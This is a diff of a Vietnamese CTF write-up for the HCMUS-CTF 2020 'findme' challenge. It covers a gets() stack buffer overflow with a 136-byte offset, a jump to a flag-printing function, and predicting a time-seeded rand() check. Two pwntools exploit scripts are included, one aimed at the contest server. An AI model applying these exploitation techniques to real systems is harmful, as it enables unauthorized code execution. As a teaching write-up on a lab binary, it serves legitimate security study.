@@ -7,14 +7,14 @@
 Tác giả: `pakkunandy`
 
 
-Tags: `pwn` `bof` `rand` `ret2syscall`
+Tags: `pwn` `bof` `rand` `ret2text`
 
 <!--
 ### Challenge Description
 -->
 
 ### Summary
-<!--
+
 Đây là challenge về buffer overflow.
 
 Đầu tiên, kiểm tra thông tin binary:
@@ -29,98 +29,162 @@ $ checksec findme
 ```
 Chương trình này chạy trên nhân x64, đã tắt hầu hết các bảo vệ.
 
-Mở chương trình với **IDA**, ta kiểm tra hàm **main**:
+Mở chương trình với **Ghidra**, ta kiểm tra hàm **main**:
 
 ```cpp
-int main()
-{
-  ...
-  char bof[64]; // [sp+0h] [bp-4Ch]@1
-  ...
+undefined8 main(void)
 
+{
+  char local_88 [128];
+  
   clean();
-  __isoc99_scanf("%s", bof);
-  ...
+  puts("Wellcome to HCMUS-CTF 2020! Please tell me your token:");
+  gets(local_88);
+  puts("So, that\'s your token! You\'re just a normal user :), Bye!!!");
   return 0;
 }
 ```
-Lỗ hổng xảy ra ở hàm `scanf` khi chương trình cố gắng đọc vào vùng nhớ `bof` trên stack nhưng lại không giới hạn số lượng kí tự nhập.
-
+Hàm này chỉ yêu cầu nhập token thông qua hàm `gets` mà không làm gì cả.  
+Như vậy ta sẽ lợi dụng hàm `gets` khi chương trình cố gắng đọc vào vùng nhớ `local_88` trên stack nhưng lại không giới hạn số lượng kí tự nhập để ghi đè địa chỉ trả về của hàm main.
 
 
 ```cpp 
-void success()
-{
-  char flag[64]; // [sp+Ch] [bp-4Ch]@4
-  FILE *fp; // [sp+4Ch] [bp-Ch]@1
+void dont_touch_me(void)
 
-  fp = fopen("flag.txt", (const char *)&unk_8048810);
-  if ( !fp )
-  {
-    puts("File not found?, please contact admin");
-    exit(0);
+{
+  time_t tVar1;
+  int local_10;
+  int local_c;
+  
+  tVar1 = time((time_t *)0x0);
+  srand((uint)tVar1);
+  local_c = rand();
+  printf("Please tell me your input!!!!");
+  __isoc99_scanf(&DAT_00400996,&local_10);
+  if (local_c == local_10) {
+    system("/bin/cat flag.txt");
   }
-  fgets(flag, 64, fp);
-  fclose(fp);
-  puts(flag);
+  return;
 }
 ```
-Ta dễ thấy thêm hàm **success**, dùng để in ra flag của challenge.
-
-Như vậy, để tới được hàm trên, ta sẽ lợi dụng lỗ hổng stack overflow để ghi đè địa chỉ trả về của hàm **main** trên stack thành địa chỉ của hàm **success** và lấy flag.
-
-### Exploit
+Ta tìm thêm được thêm hàm **dont_touch_me**, dùng để in ra flag của challenge.  
+Tuy nhiên, hàm này có một cái khó là yêu cầu người dùng nhập vào một input `local_10`, nếu bằng `local_c` được random ra thì mới trả về flag.
+ 
+### Exploit #1 
 
 - Tìm vị trí địa chỉ trả về của hàm main
     ```bash
-    $ python -c 'print "A"*64 + "BBBB"' | strace ./SimpleBOF
-    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+    $ python -c 'print "A"*136 + "BBBBBB"' | strace ./findme
+    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x424242424242} ---
     +++ killed by SIGSEGV (core dumped) +++
     Segmentation fault (core dumped)
     ```
-    Như vậy, sau **64** bytes offset thì địa chỉ trả về của hàm main (si_addr) bị ghi đè thành "BBBB" (là giá trị địa chỉ lệnh không hợp lệ dẫn đến break chương trình).
+    Như vậy, sau **136** bytes offset thì địa chỉ trả về của hàm main (si_addr) bị ghi đè thành "BBBBBB" (là giá trị địa chỉ lệnh không hợp lệ dẫn đến break chương trình).  
+    Đối với `x64`, vị trí lưu địa chỉ trả về của hàm có kích thước **6** bytes.
 
 
-
-
-- Lấy địa chỉ của hàm **success**
+- Lấy địa chỉ của hàm **dont_touch_me**
 
     ```bash
-    $ objdump -t SimpleBOF | grep success
-    08048670 g     F .text  00000087              success
+    $ objdump -t findme | grep dont_touch_me
+    000000000040084a g     F .text  0000000000000062              dont_touch_me
     ```
 
-    Kết quả: **`0x08048670`**
+    Kết quả: **`0x00000040084a`**
+
+- Bypass checker
+
+    Ta thấy `local_c` được random với seed luôn là `srand(time(NULL))`, với `time(NULL)` chính là ngày giờ hiện tại theo chuẩn `Unix`. Như vậy, ta cũng có thể viết 1 chương trình giúp rand 1 con số cho `local_10` với cùng seed của server, thì sẽ cho ra cùng một giá trị.
+
+    ```cpp
+    // get_rand.c
+    int main() {
+        int v3;
+        srand(time(0));
+  
+        v3 = rand();
+
+        //printf("%d\n", v3);
+        fwrite(&v3, 4, 1, stdout);
+
+        return 0;
+    }
+    ```  
+
+    Đoạn mã này sẽ trả ra 4 byte biểu diễn giá trị của `local_c` tại thời điểm chạy chương trình.
+
+
 - Local exploit
     
-    Ta thay "BBBB" thành địa chỉ của hàm **success**, lưu ý chuẩn [Little Endian](https://en.wikipedia.org/wiki/Endianness)
-    
-    ```bash
-    $ python -c 'print "A"*64 + "\x70\x86\x04\x08"' | ./SimpleBOF
-    File not found?, please contact admin
+    Xây dựng payload:
+
+    ```python
+        payload = "A" * offset + dont_touch_me_addr + newline + local_c
     ```
 
-    Thành công, ta chạy trên server và lấy flag thôi!
+    Chạy trên server và lấy flag.
 
-## Code
+## Exploit #2 
+
+Cách này tương tự như `Exploit #2` của [ChampionLeague](../ChampionLeague/README.md) hay [HackMe](../HackMe/README.md) challenge.  
+Thay vì nhảy tới hàm **dont_touch_me**, ta nhảy tới luôn lời gọi hàm system phía trong cho gọn và vẫn lấy được flag. 
+
+
+## Code #1
 
 ```python
 #!/usr/bin/env python
 
 from pwn import *
 
-e = ELF("./SimpleBOF")
-p = remote("159.65.13.76", 63001)
+e = ELF("./findme")
+dont_touch_me_addr = e.sym["dont_touch_me"]
 
-offset = 64
-success_addr = e.sym["success"]
+offset = 136
 
-payload = 'A'*offset + p32(success_addr)
+p = remote("159.65.13.76", 63003)
+#p = process("./findme")
+
+payload = 'A' * offset + p64(dont_touch_me_addr)[:-2]
+
+# send buffer overflow
+p.recvuntil("token:")
+p.sendline(payload)
+
+# get random with srand(time(NULL))'s seed
+rand_int = process("./get_rand")
+rand_bytes = rand_int.recv(4)
+
+#local_c's size is 4 bytes long
+local_c = int.from_bytes(rand_bytes, byteorder='little', signed=True)
+
+# send n
+p.sendline(p32(local_c))
+p.interactive()
+
+```
+
+## Code #2
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+e = ELF("./findme")
+offset = 136
+
+#p = remote("159.65.13.76", 63003)
+p = process("./findme")
+
+system_addr = 0x40089c
+
+payload = 'A' * offset + p64(system_addr)
+p.recvuntil("token:")
 
 p.sendline(payload)
 p.interactive()
 ```
--->
 
 📫 Flag: **`HCMUS-CTF{}`**
 
